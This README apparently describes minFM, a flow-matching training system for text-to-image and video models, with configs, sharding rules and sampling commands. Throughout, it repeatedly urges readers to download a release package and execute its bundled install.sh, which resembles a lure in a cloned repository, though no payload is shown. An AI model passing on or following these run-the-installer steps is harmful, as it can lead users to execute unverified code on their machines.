# minFM — Minimal Flow Matching for Text-to-Image & Video Models 🚀

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/Nafjoro/minFM/releases) [![Python](https://img.shields.io/badge/Python-3.9%2B-orange)](#) [![License](https://img.shields.io/badge/License-Apache%202.0-green)](#)

![](./resources/teasor.png)

minFM is a clean, modular, and scalable training system for text-to-image and text-to-video Flow Matching (FM) models. Use it to train compact FM models or to scale to multi-GPU clusters. The code focuses on clarity, reproducibility, and state-of-the-art sampling.

Get the release package and installer from the Releases page and run the included installer:
https://github.com/Nafjoro/minFM/releases

Key highlights
- Minimal code paths. Clear modules for dataset, model, trainer, and sampler.
- Built for image and video generative training with text conditioning.
- Multi-GPU support with flexible sharding and DIT balancer groups.
- Checkpointable, reproducible training runs.
- Example configs and prebuilt model recipes.

Download a packaged release from the Releases page and execute the included install script to get started:
https://github.com/Nafjoro/minFM/releases

Why minFM
- Small core surface. You can read the whole trainer in a single pass.
- Modular primitives. Swap samplers, noise schedules, or dataloaders with minimal changes.
- Production-minded. Checkpointing and sharding integrate with cluster workflows.

Table of contents
- Features
- Requirements
- Installation
- Quick start
- Data preparation
- Configuration guide
- Training workflow
- Inference and sampling
- Model zoo and recipes
- Examples
- Troubleshooting
- Contributing
- License
- Citation

Features
- Flow Matching training loop with support for conditioned and unconditioned targets.
- Image and video dataloaders with frame stacking, random crop, and augmentation hooks.
- Config-driven training. Use YAML to control model size, batch, optimizer, and sharding.
- Sharding primitives: `shard_size` and `dit_balancer_specs` for deterministic group layouts.
- Multi-resolution sampling and progressive training recipes.
- Exportable checkpoints compatible with downstream inference scripts.

Requirements
- NVIDIA GPUs
- Linux environment
- CUDA toolkit compatible with your PyTorch version
- Python 3.9 or newer

GPU configuration rules
- The total number of GPUs must be divisible by `shard_size`.
- The total GPUs must be divisible by the per-group GPU count in `dit_balancer_specs`. For example, `g1n4` means 4 GPUs per group. If you specify `g1n4`, the total GPU count must divide evenly by 4.
- Adjust `shard_size` and `dit_balancer_specs` to match your cluster.

Installation
1. Clone the repo
- `git clone https://github.com/Nafjoro/minFM.git && cd minFM`

2. Download a release package from the Releases page and run the included installer or install script.
- Visit: https://github.com/Nafjoro/minFM/releases
- Download the packaged release asset (for example `minFM-release.tar.gz`) and run the included `install.sh`:
  - `tar -xzf minFM-release.tar.gz`
  - `cd minFM-release && ./install.sh`

3. Create a virtual environment and install dependencies
- `python -m venv .venv && source .venv/bin/activate`
- `pip install -r requirements.txt`

4. Optional GPU optimizations
- Install cuDNN and NCCL matching your CUDA version.
- Use the provided `scripts/setup_gpus.sh` to tune environment variables for multi-node runs.

Quick start — example runs
- Run a single-GPU experiment:
  - `python train.py --config configs/flux-tiny-imagenet256.yaml --gpus 1`
- Run a 4-GPU experiment with sharding:
  - `python -m torch.distributed.launch --nproc_per_node=4 train.py --config configs/flux-tiny-imagenet256.yaml --shard_size 2`

Data preparation
- minFM expects datasets arranged in standard folders:
  - Images: `dataset_root/train/<class_or_split>/*.jpg/png`
  - Videos: `dataset_root/train/<split>/<video_id>/frames/*.jpg`
- Tokenized captions: JSONL with `{"id": "<file>", "caption": "<text>"}` pairs.
- Supported transforms:
  - Random crop, resize, flip
  - Frame sampling for video: `sample_rate`, `num_frames`
- Use `scripts/prepare_imagenet.sh` or `scripts/prepare_video.sh` for presets.

Configuration guide
- Config files live in `configs/`. They follow YAML structure:
  - model:
    - type: flux-tiny
    - image_size: 256
  - data:
    - root: /path/to/dataset
    - batch_size: 32
  - training:
    - max_steps: 200000
    - lr: 2e-4
  - sharding:
    - shard_size: 2
    - dit_balancer_specs: ["g1n4"]
- Field notes:
  - `shard_size` controls optimizer state sharding.
  - `dit_balancer_specs` groups GPUs. Format: `g<group_index>n<num_gpus_in_group>`.
  - Adjust `batch_size` per GPU to respect memory budgets.

Training workflow
- Data loader builds batches with captions and conditioning.
- The trainer runs forward/backward and updates the model.
- Checkpoint policy:
  - Save every X steps (`checkpoint_every`).
  - Keep N best by validation loss (`retain_checkpoints`).
- Resume:
  - `python train.py --config configs/... --resume checkpoints/latest.ckpt`

Sampling and inference
- Use `sample.py` to generate images or videos from a checkpoint.
- Basic command:
  - `python sample.py --checkpoint checkpoints/final.ckpt --prompt "A cat wearing a suit" --steps 100`
- Sampling options:
  - `--num_samples`
  - `--image_size`
  - `--guide_scale` for classifier-free guidance
- Video generation:
  - `--num_frames`
  - `--fps`
- Output format:
  - Images saved as PNGs in `outputs/`.
  - Videos saved as MP4 files via FFmpeg.

Model zoo and checkpoints
- The repo ships training recipes for small and medium models:
  - `flux-tiny` — fast experiments on ImageNet 256.
  - `flux-small` — higher quality at moderate cost.
- Use the Releases page to download prebuilt checkpoints and installers:
  - https://github.com/Nafjoro/minFM/releases
- Checkpoints include config metadata. Use the included `scripts/inspect_ckpt.py` to extract training hyperparams.

Example: run a full image-training experiment
1. Prepare ImageNet subset or your dataset.
2. Set `configs/flux-tiny-imagenet256.yaml`:
  - `data.root` to your dataset path
  - `training.max_steps` and `batch_size` for your GPU budget
3. Launch training:
  - `python -m torch.distributed.launch --nproc_per_node=4 train.py --config configs/flux-tiny-imagenet256.yaml`
4. Monitor logs in TensorBoard:
  - `tensorboard --logdir runs`

Advanced topics
- Mixed precision
  - Enable AMP in config: `training.amp: true`
  - AMP reduces memory and speeds up training on Amp-capable GPUs.
- Gradient accumulation
  - Use `training.accumulate_steps` to emulate larger batches.
- Custom dataloaders
  - Implement `data/your_loader.py` with the `DatasetInterface` in `data/base.py`.
- Sharding tips
  - For large models, increase `shard_size` to split optimizer state across GPUs.
  - `dit_balancer_specs` helps distribute compute evenly across groups.

Troubleshooting
- Out of memory on startup
  - Lower `batch_size` or reduce `image_size`.
  - Enable `training.amp`.
- Mismatch in GPU counts
  - Set `shard_size` and `dit_balancer_specs` so total GPUs divides evenly.
- Slow IO
  - Use an NVMe-backed dataset or preload tensors to RAM.

Monitoring and evaluation
- TensorBoard logs training loss, validation metrics, and sample grids.
- Use `eval/compute_fid.py` for FID on held-out sets.
- For video metrics, run `eval/video_metrics.py` to compute temporal consistency scores.

Testing and CI
- Unit tests for core modules live in `tests/`.
- Run tests with `pytest tests/`.
- CI runs static checks and small CPU tests. GPU tests run in scheduled workflows.

Contributing
- Fork and open a PR for fixes or features.
- Write tests for new functionality.
- Keep changes small and focused.
- Use feature branches and follow the commit style in CONTRIBUTING.md.

Common recipes
- Fast local test
  - `configs/debug-local.yaml` uses tiny model and small dataset.
- ImageNet 256 training
  - `configs/flux-tiny-imagenet256.yaml`
- Video sample recipe
  - `configs/flux-video-demo.yaml` with `num_frames: 16`

Useful scripts
- `scripts/prepare_imagenet.sh` — convert and shard ImageNet dataset
- `scripts/eval_fid.sh` — run FID evaluation on saved outputs
- `scripts/export_onnx.sh` — export model to ONNX for inference

Licensing and citation
- Licensed under Apache 2.0 (see LICENSE file).
- If you use minFM in research, cite the repository and include model recipe metadata saved in each checkpoint.

Contact and support
- Open issues for bugs or feature requests.
- Use PRs for code contributions.
- For large-scale support or integration help, open an issue and tag maintainers.

Files to check in Releases
- Installer and packaged assets: download and run the installer from the Releases page (the release typically contains `install.sh`, packaged wheels, and prebuilt checkpoints). Visit:
  - https://github.com/Nafjoro/minFM/releases

Quick links
- Releases / packaged downloads: https://github.com/Nafjoro/minFM/releases
- Configs: `configs/`
- Training script: `train.py`
- Sampling script: `sample.py`
- Examples: `examples/`

README badges and assets
- Use the Releases badge at the top to link to prebuilt packages and checkpoints.
- The repo includes the teaser image at `./resources/teasor.png` for quick preview.

Developer tips
- Keep configs in version control for reproducibility.
- Log hyperparameters and git commit hashes to each checkpoint.
- Use deterministic seeds during debug runs to reproduce issues.

Getting help
- Open an issue with a minimal repro.
- Attach logs and config files for faster response.

License
- Apache 2.0